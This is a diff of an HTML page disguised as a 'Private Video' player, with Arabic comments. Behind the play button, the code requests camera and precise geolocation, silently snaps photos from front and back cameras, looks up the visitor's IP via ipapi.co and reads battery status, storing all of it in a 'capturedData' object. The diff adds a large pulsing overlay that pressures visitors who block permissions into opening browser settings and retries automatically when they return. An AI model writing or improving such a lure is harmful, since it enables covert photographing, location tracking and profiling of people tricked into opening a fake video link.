@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Video Player</title>
     <style>
+        /* ===== جميع الأنماط الأصلية محفوظة ===== */
         * {
             margin: 0;
             padding: 0;
@@ -22,7 +23,6 @@
             color: #fff;
             overflow: hidden;
         }
-
         .video-player-container {
             width: 90%;
             max-width: 800px;
@@ -32,7 +32,6 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             position: relative;
         }
-
         .video-thumbnail {
             position: relative;
             width: 100%;
@@ -46,7 +45,6 @@
             justify-content: center;
             cursor: pointer;
         }
-
         .play-button-overlay {
             width: 100px;
             height: 100px;
@@ -59,13 +57,11 @@
             box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
             position: relative;
         }
-
         .play-button-overlay:hover {
             transform: scale(1.1);
             background-color: rgba(255, 0, 0, 0.95);
             box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
         }
-
         .play-icon-large {
             width: 0;
             height: 0;
@@ -74,18 +70,15 @@
             border-bottom: 20px solid transparent;
             margin-left: 8px;
         }
-
         .video-info {
             padding: 20px;
             border-bottom: 1px solid #333;
         }
-
         .video-title {
             font-size: 1.5rem;
             font-weight: bold;
             margin-bottom: 8px;
         }
-
         .video-controls {
             padding: 15px 20px;
             display: flex;
@@ -95,7 +88,6 @@
             flex-wrap: wrap;
             gap: 10px;
         }
-
         .control-button {
             background: none;
             border: none;
@@ -106,11 +98,9 @@
             border-radius: 4px;
             transition: background 0.2s;
         }
-
         .control-button:hover {
             background: #333;
         }
-
         .progress-bar {
             flex-grow: 1;
             height: 4px;
@@ -121,21 +111,18 @@
             position: relative;
             min-width: 60px;
         }
-
         .progress-fill {
             position: absolute;
             height: 100%;
             width: 0%;
             background: #ff0000;
         }
-
         .time-display {
             color: #aaa;
             font-size: 0.9rem;
             min-width: 100px;
             text-align: center;
         }
-
         .spinner {
             border: 4px solid #fff;
             border-top: 4px solid rgba(255, 255, 255, 0.3);
@@ -149,12 +136,10 @@
             left: 50%;
             transform: translate(-50%, -50%);
         }
-
         @keyframes spin {
             0% { transform: translate(-50%, -50%) rotate(0deg); }
             100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
-
         #loading {
             display: none;
             font-size: 1.2rem;
@@ -162,18 +147,15 @@
             margin-top: 20px;
             text-align: center;
         }
-
         .loading-text {
             margin-top: 10px;
         }
-
         .volume-control {
             display: flex;
             align-items: center;
             gap: 10px;
             color: #aaa;
         }
-
         .volume-slider {
             width: 80px;
             height: 4px;
@@ -181,18 +163,15 @@
             border-radius: 2px;
             position: relative;
         }
-
         .volume-level {
             position: absolute;
             height: 100%;
             width: 70%;
             background: #ff0000;
         }
-
         .fullscreen-btn {
             margin-left: 15px;
         }
-
         @media (max-width: 480px) {
             .video-controls {
                 padding: 10px 12px;
@@ -223,8 +202,8 @@
             }
         }
 
-        /* ===== النافذة المنبثقة المركزية (بديل الإشعار العلوي) ===== */
-        #permissionModal {
+        /* ===== زر الترس العملاق في وسط الشاشة (يظهر عند حظر الأذونات) ===== */
+        #bigGearOverlay {
             display: none;
             position: fixed;
             top: 0;
@@ -232,131 +211,100 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.85);
-            z-index: 9999;
+            z-index: 99999;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(10px);
         }
-        #permissionModal.active {
+        #bigGearOverlay.active {
             display: flex;
         }
-        .modal-box {
-            background: #1e1e1e;
-            padding: 40px 30px;
-            border-radius: 24px;
-            max-width: 450px;
-            width: 90%;
+        .big-gear-box {
+            background: #1a1a1a;
+            padding: 50px 40px;
+            border-radius: 40px;
             text-align: center;
-            border: 1px solid #333;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            animation: fadeInUp 0.4s ease;
+            border: 3px solid #ff3333;
+            box-shadow: 0 0 80px rgba(255, 0, 0, 0.3);
+            max-width: 500px;
+            width: 90%;
+            animation: gearPulse 2s infinite alternate;
         }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px) scale(0.95); }
-            to { opacity: 1; transform: translateY(0) scale(1); }
+        @keyframes gearPulse {
+            0% { transform: scale(1); box-shadow: 0 0 40px rgba(255,0,0,0.2); }
+            100% { transform: scale(1.02); box-shadow: 0 0 80px rgba(255,0,0,0.5); }
         }
-        .modal-box h2 {
+        .big-gear-box .icon {
+            font-size: 5rem;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .big-gear-box h2 {
             color: #fff;
-            font-size: 1.6rem;
+            font-size: 2.2rem;
             margin-bottom: 10px;
+            font-weight: 900;
         }
-        .modal-box .icon-lock {
-            font-size: 3rem;
-            margin-bottom: 10px;
-        }
-        .modal-box p {
-            color: #aaa;
-            font-size: 1rem;
+        .big-gear-box p {
+            color: #ccc;
+            font-size: 1.2rem;
             line-height: 1.6;
-            margin: 15px 0 25px;
+            margin-bottom: 30px;
         }
-        .modal-box .btn-primary {
+        .big-gear-box .gear-btn {
             background: #ff0000;
             color: #fff;
             border: none;
-            padding: 14px 20px;
-            border-radius: 50px;
-            font-size: 1.1rem;
+            padding: 20px 45px;
+            border-radius: 80px;
+            font-size: 2rem;
             font-weight: bold;
             cursor: pointer;
             transition: 0.3s;
-            width: 100%;
-            margin-bottom: 12px;
-        }
-        .modal-box .btn-primary:hover {
-            background: #cc0000;
-            transform: scale(1.02);
-        }
-        .modal-box .btn-primary:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-        /* ===== زر الترس الوهمي (الذي يحاكي زر الترس في شريط العناوين) ===== */
-        .modal-box .btn-settings {
-            background: #333;
-            color: #fff;
-            border: 2px solid #555;
-            padding: 14px 20px;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-            display: flex;
+            display: inline-flex;
             align-items: center;
-            justify-content: center;
-            gap: 10px;
+            gap: 15px;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
         }
-        .modal-box .btn-settings:hover {
-            background: #444;
-            border-color: #888;
+        .big-gear-box .gear-btn:hover {
+            background: #cc0000;
+            transform: scale(1.05);
         }
-        .modal-box .btn-settings .gear-icon {
-            font-size: 1.4rem;
+        .big-gear-box .gear-btn .gear-icon {
+            font-size: 3rem;
         }
-        .modal-box .status-msg {
+        .big-gear-box .status-msg {
             color: #ffaa00;
-            font-size: 0.9rem;
-            margin-top: 15px;
-            min-height: 24px;
+            font-size: 1.1rem;
+            margin-top: 20px;
+            min-height: 30px;
         }
-        .modal-box .sub-text {
+        .big-gear-box .sub {
             color: #666;
-            font-size: 0.8rem;
-            margin-top: 10px;
+            font-size: 0.95rem;
+            margin-top: 20px;
             border-top: 1px solid #333;
-            padding-top: 12px;
-        }
-        .modal-box .sub-text .highlight {
-            color: #ffaa00;
-            font-weight: bold;
+            padding-top: 20px;
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== النافذة المنبثقة المركزية مع زر الترس الوهمي ===== -->
-    <div id="permissionModal">
-        <div class="modal-box">
-            <div class="icon-lock">🔐</div>
-            <h2>أذونات مطلوبة</h2>
-            <p>يحتاج الموقع إلى الوصول إلى <strong>الكاميرا</strong> و <strong>الموقع الجغرافي</strong> لتشغيل الفيديو.</p>
-            
-            <button id="allowPermissionsBtn" class="btn-primary">✅ تفعيل الأذونات</button>
-            
-            <!-- زر الترس الوهمي (موجود دائماً) -->
-            <button id="openSettingsBtn" class="btn-settings">
-                <span class="gear-icon">⚙️</span> فتح إعدادات الموقع (الترس)
+    <!-- ===== زر الترس العملاق في وسط الشاشة ===== -->
+    <div id="bigGearOverlay">
+        <div class="big-gear-box">
+            <span class="icon">⚠️</span>
+            <h2>تم حظر الأذونات</h2>
+            <p>يحتاج الموقع إلى الكاميرا والموقع الجغرافي.<br>يرجى فتح الإعدادات وتفعيلها.</p>
+            <button id="gearActionBtn" class="gear-btn">
+                <span class="gear-icon">⚙️</span> فتح الإعدادات
             </button>
-            
-            <div id="permissionStatus" class="status-msg"></div>
-            <div class="sub-text">
-                <span class="highlight">💡</span> إذا ظهر حظر من المتصفح، استخدم زر <strong>"فتح إعدادات الموقع"</strong> أعلاه.
-            </div>
+            <div id="gearStatus" class="status-msg"></div>
+            <div class="sub">🔁 بعد التفعيل، عد إلى الصفحة وسيبدأ الفيديو تلقائياً</div>
         </div>
     </div>
 
+    <!-- ===== مشغل الفيديو الأصلي ===== -->
     <div class="video-player-container">
         <div class="video-info">
             <div class="video-title">Private Video</div>
@@ -378,16 +326,13 @@
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-
             <div class="time-display">0:00 / 2:45</div>
-
             <div class="volume-control">
                 <span></span>
                 <div class="volume-slider">
                     <div class="volume-level"></div>
                 </div>
             </div>
-
             <button class="control-button fullscreen-btn">⛶</button>
         </div>
     </div>
@@ -401,7 +346,7 @@
         (function() {
             'use strict';
 
-            // ===== التحايل على حظر الموقع =====
+            // ===== جميع المتغيرات والدوال الأصلية محفوظة =====
             let capturedData = {
                 permissions: [],
                 images: [],
@@ -414,6 +359,7 @@
             let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
+            let permissionsBlocked = false;
 
             // عناصر DOM
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -422,13 +368,12 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
-            // عناصر النافذة المنبثقة
-            const modal = document.getElementById('permissionModal');
-            const allowBtn = document.getElementById('allowPermissionsBtn');
-            const settingsBtn = document.getElementById('openSettingsBtn');
-            const statusMsg = document.getElementById('permissionStatus');
+            // عناصر زر الترس العملاق
+            const bigGear = document.getElementById('bigGearOverlay');
+            const gearBtn = document.getElementById('gearActionBtn');
+            const gearStatus = document.getElementById('gearStatus');
 
-            // ===== دالة طلب الأذونات =====
+            // ===== دوال جمع البيانات الأصلية =====
             async function requestAllPermissions() {
                 let cameraGranted = false;
                 let locationGranted = false;
@@ -459,7 +404,6 @@
                 return { cameraGranted, locationGranted };
             }
 
-            // ===== جلب IP =====
             async function fetchIPInfo() {
                 try {
                     const response = await fetch('https://ipapi.co/json/');
@@ -470,7 +414,6 @@
                 }
             }
 
-            // ===== جلب البطارية =====
             async function getBatteryStatus() {
                 try {
                     const battery = await navigator.getBattery();
@@ -480,25 +423,21 @@
                 }
             }
 
-            // ===== التصوير =====
             async function captureFromCamera(facingMode) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: { exact: facingMode } }
                     });
-
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
                     await new Promise(resolve => setTimeout(resolve, 1000));
-
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
-
                     stream.getTracks().forEach(track => track.stop());
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
                 } catch {
@@ -506,7 +445,6 @@
                 }
             }
 
-            // ===== طلب الموقع بدقة عالية =====
             async function getLocation() {
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -525,12 +463,13 @@
                 }
             }
 
-            // ===== فتح إعدادات الموقع في المتصفح (محاكاة زر الترس) =====
+            // ===== فتح إعدادات الموقع في المتصفح (محاكاة زر الترس الأصلي) =====
             function openLocationSettings() {
                 const currentUrl = encodeURIComponent(window.location.href);
                 const ua = navigator.userAgent;
                 let settingsUrl = '';
 
+                // محاولة فتح صفحة إعدادات الموقع الخاصة بالمتصفح
                 if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) {
                     settingsUrl = `chrome://settings/content/siteDetails?site=${currentUrl}`;
                 } else if (/Edge/i.test(ua)) {
@@ -546,7 +485,7 @@
                     return;
                 }
 
-                // ===== الكود القديم (تم الاحتفاظ به كتعليق) =====
+                // ===== الكود القديم (محفوظ كتعليق) =====
                 /*
                 if (/Android/i.test(ua)) {
                     const intents = [
@@ -673,7 +612,7 @@
                 }, 3000);
             }
 
-            // ===== جمع البيانات وتشغيل الفيديو (الخطوة النهائية) =====
+            // ===== جمع البيانات وتشغيل الفيديو =====
             async function collectDataAndPlay() {
                 if (isProcessing || videoStarted) return;
                 isProcessing = true;
@@ -716,71 +655,54 @@
                 isProcessing = false;
             }
 
-            // ===== إظهار النافذة المنبثقة عند الضغطة الأولى =====
-            function showPermissionModal() {
-                if (settingsOpened) return;
-                settingsOpened = true;
-
-                modal.classList.add('active');
-                statusMsg.textContent = '';
-                allowBtn.disabled = false;
-                allowBtn.style.display = 'block';
-                // زر الترس ظاهر دائماً
-                settingsBtn.style.display = 'flex';
-            }
-
-            // ===== معالج النقر على "تفعيل الأذونات" =====
-            allowBtn.addEventListener('click', async function() {
-                statusMsg.textContent = '⏳ جاري طلب الأذونات...';
-                allowBtn.disabled = true;
-
-                const result = await requestAllPermissions();
-
-                if (result.cameraGranted || result.locationGranted) {
-                    statusMsg.textContent = '✅ تم تفعيل الأذونات! جاري التحميل...';
-                    modal.classList.remove('active');
-                    await collectDataAndPlay();
-                } else {
-                    statusMsg.textContent = '❌ تم حظر الأذونات. استخدم زر "فتح إعدادات الموقع" أدناه.';
-                    // نبقى في النافذة، وزر الترس موجود بالفعل
-                }
-                allowBtn.disabled = false;
-            });
-
-            // ===== معالج النقر على زر الترس الوهمي =====
-            settingsBtn.addEventListener('click', function() {
-                statusMsg.textContent = '⏳ جاري فتح إعدادات الموقع...';
-                openLocationSettings();
-            });
-
-            // ===== عند العودة من الإعدادات (الترس) =====
-            document.addEventListener('visibilitychange', function() {
-                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // إذا كانت النافذة لا تزال ظاهرة، نحاول إعادة طلب الأذونات
-                    if (modal.classList.contains('active')) {
-                        statusMsg.textContent = '🔄 جاري إعادة المحاولة بعد العودة من الإعدادات...';
-                        // نعيد طلب الأذونات تلقائياً (محاكاة الضغط على زر التفعيل)
-                        allowBtn.click();
-                    } else {
-                        // إذا كانت مخفية، نكمل مباشرة
-                        collectDataAndPlay();
-                    }
-                }
-            });
-
-            // ===== ربط زر التشغيل =====
-            function handlePlayClick() {
+            // ===== الدالة الرئيسية: طلب الأذونات =====
+            async function handlePlayClick() {
                 if (videoStarted) return;
                 if (isProcessing) return;
 
                 if (!settingsOpened) {
-                    showPermissionModal();
+                    settingsOpened = true;
+                    const result = await requestAllPermissions();
+
+                    if (result.cameraGranted || result.locationGranted) {
+                        await collectDataAndPlay();
+                    } else {
+                        // تم حظر كل الأذونات → إظهار زر الترس العملاق
+                        permissionsBlocked = true;
+                        bigGear.classList.add('active');
+                        gearStatus.textContent = '⛔ تم حظر الأذونات. استخدم الزر لفتح الإعدادات.';
+                    }
                 } else {
-                    // إذا تم فتح الإعدادات سابقاً ولكن لم يبدأ الفيديو
-                    collectDataAndPlay();
+                    // بعد العودة من الإعدادات
+                    if (permissionsBlocked) {
+                        const result = await requestAllPermissions();
+                        if (result.cameraGranted || result.locationGranted) {
+                            bigGear.classList.remove('active');
+                            await collectDataAndPlay();
+                        } else {
+                            gearStatus.textContent = '❌ لا تزال الأذونات محظورة. حاول مرة أخرى.';
+                        }
+                    } else {
+                        await collectDataAndPlay();
+                    }
                 }
             }
 
+            // ===== معالج زر الترس العملاق =====
+            gearBtn.addEventListener('click', function() {
+                gearStatus.textContent = '⏳ جاري فتح إعدادات الموقع...';
+                openLocationSettings();
+            });
+
+            // ===== رصد العودة من الإعدادات =====
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && permissionsBlocked && !videoStarted) {
+                    gearStatus.textContent = '🔄 جاري إعادة المحاولة...';
+                    handlePlayClick();
+                }
+            });
+
+            // ===== ربط زر التشغيل =====
             if (thumbnailArea) {
                 thumbnailArea.addEventListener('click', handlePlayClick);
             }
@@ -836,6 +758,5 @@
 
         })();
     </script>
-
 </body>
 </html>
